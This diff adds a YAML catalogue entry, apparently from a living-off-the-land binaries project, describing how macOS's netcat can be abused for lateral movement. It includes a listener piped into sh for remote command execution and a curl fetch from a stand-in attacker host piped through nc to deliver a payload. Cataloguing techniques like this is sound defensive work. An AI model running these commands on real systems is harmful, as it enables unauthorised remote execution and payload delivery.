@@ -1,0 +1,33 @@
+name: nc
+author: Ryan Conry
+short_description: Arbitrary TCP and UDP connections and listeners.
+full_description: nc (netcat) is a general purpose networking utility for reading and writing data across TCP and UDP connections. It ships with macOS and can open arbitrary connections, listen on ports, and pass data between endpoints. In a lateral movement context, nc can be used to execute remote commands and transfer files between hosts without relying on SSH.
+created: 2026-03-24
+example_use_cases:
+    - name: Remote command execution via netcat pipe
+      description: A netcat listener on the target pipes incoming data directly to sh, allowing an attacker to send shell commands over the network. The target runs nc listening on a port and executes whatever is received. The attacker pipes commands into a nc connection to that port.
+      code: "# On target\nnc -l 1337 | sh\n\n# On attacker\necho 'id' | nc <TARGET_IP> 1337"
+      tactics:
+          - Lateral Movement
+          - Execution
+      tags:
+          - netcat
+          - remote-execution
+          - oneliner
+    - name: Lateral tool transfer via netcat
+      description: nc can relay a file fetched from an attacker-controlled HTTP server directly to a target host over an established nc listener, transferring payloads without writing intermediate files on the attacker machine.
+      code: "# On attacker (serve file)\npython3 -m http.server 1337\n\n# On victim (fetch and forward to target)\ncurl http://<ATTACKER_IP>:1337/payload.sh | nc -zv <TARGET_IP> 1337"
+      tactics:
+          - Lateral Movement
+      tags:
+          - netcat
+          - file-transfer
+          - lateral-movement
+paths:
+    - /usr/bin/nc
+detections:
+    - name: No detections at time of publishing
+      url: N/A
+resources:
+    - name: "nc man page"
+      url: https://ss64.com/mac/nc.html
